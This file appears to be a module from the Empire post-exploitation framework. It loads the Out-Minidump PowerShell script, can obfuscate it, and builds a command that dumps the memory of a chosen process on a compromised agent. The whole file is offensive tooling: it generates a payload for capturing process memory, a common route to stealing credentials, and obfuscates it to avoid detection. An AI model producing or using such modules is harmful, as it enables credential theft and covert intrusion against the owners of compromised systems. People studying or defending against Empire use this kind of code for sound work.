from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/collection/Out-Minidump.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        module_code = f.read()
        f.close()

        script = module_code
        
        script_end = ""

        for option,values in params.items():
            if option.lower() != "agent":
                if values and values != '':
                    if option == "ProcessName":
                        script_end = "Get-Process " + values + " | Out-Minidump"
                    elif option == "ProcessId":
                        script_end = "Get-Process -Id " + values + " | Out-Minidump"
        
        for option, values in params.items():
            if values and values != '':
                if option != "Agent" and option != "ProcessName" and option != "ProcessId":
                    script_end += " -" + str(option) + " " + str(values)

        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = helpers.keyword_obfuscation(script)

        return script
